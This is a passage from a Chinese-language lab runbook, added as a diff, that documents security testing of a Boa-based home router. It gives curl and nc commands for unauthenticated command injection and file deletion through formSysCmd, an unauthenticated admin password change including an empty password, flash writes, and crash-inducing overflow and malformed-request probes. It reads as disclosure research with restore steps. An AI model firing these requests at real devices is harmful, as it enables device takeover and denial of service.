+> （`A3.7`），所以一個已經快取憑證的瀏覽器仍然會自動附上憑證 ——
+> **「沒有 session」不等於「沒有 CSRF 面」**，只是這個 handler 要 POST。
+
+#### A3.9.8 清乾淨
+
+```bash
+curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
+  --data-urlencode 'sysCmd=rm -f /var/web/w06.txt /var/web/cpu.txt;#' \
+  --data 'submit-url=/syscmd.htm'
+curl -s -o /dev/null -w 'w06.txt now: HTTP %{http_code}\n' http://10.1.1.1/w06.txt
+```
+
+**預期**：`404`。`/var` 是 ramfs，重開機也會清掉 —— **但不要靠重開機收尾，
+因為那樣你就不知道是刪掉了還是重開清掉的。**
+
+---
+
+### A3.10 🔌 ★★ 第 ⑤ 環：指著 flash 上被改掉的那幾個 byte（關 `P3-5`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3（開火）+ T2（前後快照） | **寫 flash，重開機不會消失** | [`RUNBOOK` §8.12.19](RUNBOOK.md) | 未執行過（撰於 2026-08-17） |
+
+**先決條件**：`A2.5` 通過（`P0-3`）；`A3.9.2` 已證明注入成立；前置快照已抓
+
+**別人證明命令執行了，靠的是 HTTP 回應或一個 ICMP 封包。
+這一節是指著 SPI NOR 上被改掉的那幾個 byte 說「這是那個 HTTP 請求做的」。**
+
+#### A3.10.1 前：抓快照（回第 2 站）
+
+照 `A2.3` 抓一份 `-pre.bin`。**這一步要斷電重開進 bootloader，所以它排在
+第 3 站所有純讀的東西之後。**
+
+#### A3.10.2 開火，用一個無害但認得出來的值
+
+```bash
+curl -s -o /dev/null -w 'HTTP %{http_code}\n' -X POST http://10.1.1.1/boafrm/formWsc \
+  --data-urlencode 'localPin=13572468' --data 'submit-url=/wireless.htm'
+sleep 5
+```
+
+> 🔴 **這一發不帶任何分隔符，而那是刻意的。** `localPin=13572468` 走的是
+> `sprintf(buf[100], "flash set HW_WLAN0_WSC_PIN %s", localPin); system(buf)`
+> 的**正常**路徑 —— 目的不是注入，是讓 `flash set` 把一個**我選的值**寫進設定區。
+> **注入那一半 `A3.9` 已經證明了；這一節證明的是那條路真的到 flash。**
+
+> ⚠️ **`13572468` 是 8 位數，因為 WPS PIN 就是 8 位數。**
+> 換一個長度或加分隔符，你就同時改了兩個變數。
+
+#### A3.10.3 後：再抓一份，然後把差異翻譯成欄位名
+
+```bash
+D="$HOME/fwre-work/dumps"
+bash tools/config-attrib.sh "$D/"*-pre.bin "$D/config-region-post-p35.bin"
+```
+
+**預期**：`COMPCS` 有一個欄位動了，而它的名字是 `HW_WLAN0_WSC_PIN`，值是 `13572468`。
+
+> ★ **這一步一次證明五件事，而每一件都指得回一份可重新產生的產物：**
+>
+> | | |
+> |---|---|
+> | 命令真的執行了 | 不是靠回應、不是靠封包，靠**持久儲存被改了** |
+> | `system()` 收到的是我送的字串 | 寫進去的值就是我送的值 |
+> | W04 的根因讀對了 | 那一行確實是 `flash set HW_WLAN0_WSC_PIN %s` |
+> | W04-2 的解碼器是對的 | 它能把 flash 的變化翻譯成一個**有名字**的欄位 |
+> | W02 的 dump 路徑仍然有效 | 同一條 `FLR`+`DB`，第三次用途 |
+
+> 🔴 **`H601`（`0x6000`–`0x8000`）必須是 `UNCHANGED`。** 每一次歸因都先看那一行。
+> 它動了 → 停下來，那是這台唯一一份 MAC 與射頻校準。
+
+> ⚠️ **`COMPDS` 大概也會動。** `A3.8.5` 量到未認證的設定寫入會**同時**覆蓋出廠預設區。
+> 那不是這一節的錯，是 `D-10` 那個發現本身 —— **但它代表 `A2.6` 的還原要再做一次**，
+> 而這次可以順便驗證：**`COMPDS` 是不是每一次 POST 都被覆蓋，還是只有某些 handler。**
+
+#### A3.10.4 改回去，並確認改回去了
+
+```bash
+# 原值從 -pre.bin 解出來,不要用記憶裡的
+"$HOME/fwre-work/venv/bin/python" -m fwrecon compcs "$D/"*-pre.bin --offset 0xC000 \
+  --mib "$HOME/fwre-work/extracted/unit-2018/squashfs-root/lib/libapmib.so" \
+  --disclosure reveal -f md | grep -i 'WSC_PIN'
+```
+
+```bash
+curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formWsc \
+  --data-urlencode 'localPin=<上面那個原值>' --data 'submit-url=/wireless.htm'
+```
+
+> **能把裝置恢復原狀是這個實驗完整的一部分**，而且它順便證明這個注入是
+> **可重複、可控、可逆的** —— 不是一次僥倖。
+
+---
+
+### A3.11 🔌 未認證改管理密碼，以及把它設成空字串（關 `P10-3` · `P10-4`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **寫 flash，而且寫的是憑證** | [`RUNBOOK` §8.12.20](RUNBOOK.md) | 未執行過（撰於 2026-08-17） |
+
+**先決條件**：`A3.6` / `A3.7` 已完成（那條 CVE-2019-19822 → 19823 的鏈**必須先做完**）；
+`A2.6` 的還原路徑已經驗過；前置快照已抓
+
+> 🔴 **這一節排在第 3 站的倒數第二，理由不是危險程度，是依賴關係。**
+> `A3.6`+`A3.7` 那條鏈的內容是「從 flash 解出來的密碼可以登入」。
+> **這一節會把那個密碼換掉**，所以順序反了就毀掉這個專案最硬的一條證據。
+
+#### A3.11.1 `P10-3`：不帶憑證改密碼
+
+```bash
+curl -s -o /dev/null -w 'HTTP %{http_code}\n' -X POST http://10.1.1.1/boafrm/formPasswordSetup \
+  --data 'username=admin' --data 'newpass=w06test' --data 'confirmpass=w06test' \
+  --data 'submit-url=/password.htm'
+sleep 3
+curl -s -o /dev/null -w 'old creds: %{http_code}\n' -u '<舊帳號>:<舊密碼>' http://10.1.1.1/password.htm
+curl -s -o /dev/null -w 'new creds: %{http_code}\n' -u 'admin:w06test' http://10.1.1.1/password.htm
+```
+
+**預期**：舊憑證 `302`（被擋），新憑證 `200`。**那就是未認證改掉管理密碼。**
+
+> ⚠️ **參數名是猜的，這裡要誠實。** `formPasswordSetup` 的實際欄位名要從
+> `/web` bundle 裡那一頁的表單讀出來，**不是從別的機型抄**。
+> 打之前先 `curl -s http://10.1.1.1/password.htm`（帶憑證）把 `<input name=...>` 抓出來。
+> **拿錯欄位名的結果是「沒反應」，而那跟「被擋下來」長得一模一樣。**
+
+#### A3.11.2 `P10-4`：把密碼設成空字串（本專案獨家，`D-4`）
+
+```bash
+curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formPasswordSetup \
+  --data 'username=admin' --data 'newpass=' --data 'confirmpass=' \
+  --data 'submit-url=/password.htm'
+sleep 3
+curl -s -o /dev/null -w 'no credentials at all: %{http_code}\n' http://10.1.1.1/password.htm
+```
+
+**預期**：`200`。`0x0040bd18` 的 `beq` 讀起來是「`USER_PASSWORD` 為空時整段比對被跳過」，
+**而如果它成立，這台在這個狀態下對每一個頁面都不再要求任何憑證。**
+
+> 🔴 **這是 `D-4`，沒有任何 CVE 描述這個行為，而它的價值在於「可達性」不在於那個分支。**
+> 分支存不存在是靜態的事，W04-2 已經讀了。**真正的問題是：有沒有一條未認證的路
+> 可以把它設成空。** `A3.11.1` 就是那條路 —— 兩項合起來才是一個發現。
+
+> ❌ **仍然要求認證 → `X-9` 撤回**，那個 `beq` 的語意讀錯了。
+> **這也是一個結果**，而且它要寫進 `docs/disclosure.md` 把 `D-4` 收掉。
+
+#### A3.11.3 還原憑證，並且驗證還原了
+
+```bash
+curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formPasswordSetup \
+  --data 'username=<原帳號>' --data 'newpass=<原密碼>' --data 'confirmpass=<原密碼>' \
+  --data 'submit-url=/password.htm'
+sleep 3
+curl -s -o /dev/null -w 'restored: %{http_code}\n' -u '<原帳號>:<原密碼>' http://10.1.1.1/password.htm
+curl -s -o /dev/null -w 'unauth  : %{http_code}\n' http://10.1.1.1/password.htm
+```
+
+**預期**：`restored: 200`，`unauth: 302`。
+
+> 🔴 **兩行都要看。** 只看第一行的話，「密碼還原了」和「這台已經不檢查密碼了」
+> 會給出一樣的輸出。
+
+---
+
+### A3.12 🔌 會把 `boa` 弄掉的那一梯次 —— 排在第 3 站最後（關 `P4-1` · `P4-2` · `P4-3` · `P4-4` · `P2-6`）
+
+| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
+|---|---|---|---|
+| T3 | **會讓 web server 消失，而且 `rcS` 只起它一次** | [`RUNBOOK` §8.12.21](RUNBOOK.md) | 未執行過（撰於 2026-08-17） |
+
+**先決條件**：**這一站其他每一節都做完了**；快照已抓
+
+> 🔴 **`rcS` 起 `boa` 一次，沒有任何東西會重起它。** `A3.8` 量過兩次：
+> `boa` 掉了之後二十分鐘還是掉的，`ping` 照樣通，console 一行都不印。
+> **所以這一梯次每一項之後都要探活，而復原手段只有斷電重開。**
+
+```bash
+alive() { curl -sf -m 5 -o /dev/null http://10.1.1.1/ && echo "  alive" || echo "  DEAD"; }
+```
+
+#### A3.12.1 `P4-1`：不帶 `submit-url`（`D-2`，本專案獨家）
+
+```bash
+alive
+curl -s -o /dev/null -w 'no submit-url: HTTP %{http_code} in %{time_total}s\n' -m 15 \
+  -X POST http://10.1.1.1/boafrm/formWlanRedirect
+alive
+```
+
+**預期（照 2015 那份量出來的讀法）**：參數缺席時 handler 拿到 `""` 字面量的**位址**，
+然後 `strcpy` 進去 —— 而那在唯讀段。**一個請求、零 payload 的未認證 DoS。**
+
+> ⚠️ **`P4-1` 跟 `A3.8` 量到的那個停頓是兩件事**，不要混講：
+> `A3.8` 那個是**帶** `submit-url` 的合法 POST，會佔住 server 4–10 秒（`D-9`）；
+> 這一個是**不帶**，而它寫進唯讀段。**同一個 handler，兩種完全不同的失效。**
+
+> ❌ **`alive` 之後是 `DEAD` → 這一項成立，而且第 3 站到此為止。**
+> 剩下的 `P4-2`/`P4-3`/`P4-4`/`P2-6` 各自需要一次斷電重開 + 45 秒。
+> **先記錄，再決定要不要花那幾次開機循環。**
+
+#### A3.12.2 `P4-2`：`submit-url=` 空值
+
+```bash
+alive
+curl -s -o /dev/null -w 'empty submit-url: HTTP %{http_code}\n' -m 15 \
+  -X POST http://10.1.1.1/boafrm/formWlanRedirect --data 'submit-url='
+alive
+```
+
+**預期**：空字串與缺席是兩條不同的路徑，破壞程度較低。
+**兩者行為相同 → 它們其實是同一條路徑，`P4-2` 併回 `P4-1`。**
+
+#### A3.12.3 `P4-3` / `P4-4`：兩組長度階梯，而它們的偏移不同
+
+```bash
+for n in 96 100 104 120 160 200; do
+  alive
+  printf 'len=%d ' "$n"
+  curl -s -o /dev/null -w 'HTTP %{http_code}\n' -m 15 \
+    -X POST http://10.1.1.1/boafrm/formWlanRedirect \
+    --data-urlencode "submit-url=/$(python3 -c "print('A'*($n-1))")"
+done
+alive
+```
+
+**預期**：`lastUrl[100]` 的大小來自符號表不是猜的，而**緊接其後的兩個物件是
+`needReboot` 與 `run_init_script_flag`** —— 所以溢位先改到的是**旗標**，
+不是返回位址。**觀察點因此不是崩潰，是這台會不會自己重開機。**
+
+> ★ **這就是為什麼這一項留在 W06 而 `P4-5` 之後全部移到 W07：**
+> 這一組有一個**事先寫下來的、具體的、可觀察的**預測（`.bss` 佈局 → 重開機），
+> 一個請求一次。`P4-5` 以後那些要的是崩潰 + `epc` 可控，
+> **而這台沒有 shell、沒有 gdbserver，`epc` 的 oracle 目前並不存在。**
+
+```bash
+# P4-4 —— 20-byte 那一組,偏移與 100 那組完全不同
+for n in 16 20 24 40 80; do
+  alive
+  printf 'ifname len=%d ' "$n"
+  curl -s -o /dev/null -w 'HTTP %{http_code}\n' -m 15 \
+    -X POST http://10.1.1.1/boafrm/formWlanSetup \
+    --data-urlencode "ifname=$(python3 -c "print('B'*$n)")" --data 'submit-url=/wireless.htm'
+done
+alive
+```
+
+#### A3.12.4 `P2-6`：HTTP 協定層畸形（**這一梯次的最後一項**）
+
+```bash
+alive
+printf 'GET / \r\n\r\n'                          | timeout 5 nc 10.1.1.1 80 | head -3 ; alive
+printf 'GET / HTTP/9.9\r\nHost: x\r\n\r\n'       | timeout 5 nc 10.1.1.1 80 | head -3 ; alive
+printf 'POST /boafrm/formSysCmd HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nsysCm\r\n0\r\n\r\n' \
+  | timeout 5 nc 10.1.1.1 80 | head -3 ; alive
+```
+
+**預期**：Boa 0.94 對 chunked 支援很差，畸形請求較可能造成解析錯誤而不是繞過。
+**全部正確回 `400` → 這條收掉，不用再花時間。**
+
+> 🔴 **每一發之後都 `alive`，而且畸形請求排在整節最後** ——
+> 它最可能弄掛 server，而弄掛之後前面每一項的結果都會變成「連不上」，
+> **那跟「端點不存在」長得一模一樣。**
 
 ---
 
